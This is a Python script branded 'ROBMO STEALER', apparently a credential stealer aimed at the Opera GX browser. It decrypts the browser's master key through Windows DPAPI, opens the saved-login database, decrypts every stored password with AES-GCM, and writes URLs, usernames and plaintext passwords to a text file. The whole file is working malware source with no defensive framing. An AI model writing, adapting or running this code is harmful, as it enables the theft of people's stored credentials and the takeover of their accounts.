import os
import sqlite3
import base64
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime, timedelta
import shutil
import json

intro = """
╔════════════════════════════════════════════════╗

   ██████╗░░█████╗░██████╗░███╗░░░███╗░█████╗░
   ██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗
   ██████╔╝██║░░██║██████╦╝██╔████╔██║██║░░██║
   ██╔══██╗██║░░██║██╔══██╗██║╚██╔╝██║██║░░██║
   ██║░░██║╚█████╔╝██████╦╝██║░╚═╝░██║╚█████╔╝
   ╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝░░░░░╚═╝░╚════╝░
   
╚════════════════════════════════════════════════╝
"""

robmo = """\n\n▂ ▃ ▄ ▅ ▆ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ▇ ▆ ▅ ▄ ▃ ▂\n"""

def get_master_key(path: str):
    if not os.path.exists(path):
        return None

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key)
    encrypted_key = encrypted_key[5:]

    try:
        decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        print(f"Error decrypting key: {str(e)}")
        return None

def decrypt_password(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def get_saved_passwords(browser_profile_path, master_key):
    login_data = os.path.join(browser_profile_path, 'Login Data')
    shutil.copy2(login_data, "LoginData.db")  # Copy the login data to a temporary location to avoid database lock issues

    conn = sqlite3.connect("LoginData.db")
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    login_data = cursor.fetchall()

    decrypted_passwords = []
    for data in login_data:
        url, username, password = data
        password = decrypt_password(password, master_key)
        decrypted_passwords.append((url, username, password))

    conn.close()
    os.remove("LoginData.db")

    return decrypted_passwords

def save_passwords_to_file(passwords, output_path, intro):
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(intro + robmo + "\n")
        for url, username, password in passwords:
            f.write(f"URL: {url}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}")
            f.write("\n\n▂ ▃ ▄ ▅ ▆ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ▇ ▆ ▅ ▄ ▃ ▂" + "\n\n")

def main():
    user = os.path.expanduser("~")
    
    profile_path = os.path.join(user, "AppData\\Roaming\\Opera Software\\Opera GX Stable")
    master_key = get_master_key(profile_path)

    if master_key:
        saved_passwords = get_saved_passwords(profile_path, master_key)
        if saved_passwords:
            output_folder = os.path.join(user, "𝐔𝐬𝐞𝐫 𝟏")
            if not os.path.exists(output_folder):
                os.makedirs(output_folder, exist_ok=True)
            output_path = os.path.join(output_folder, "OPERA.txt")
            save_passwords_to_file(saved_passwords, output_path, intro)
            print(f"Password data saved to {output_path}")
        else:
            print("No saved passwords found.")
    else:
        print("Master key not found.")

if __name__ == "__main__":
    main()
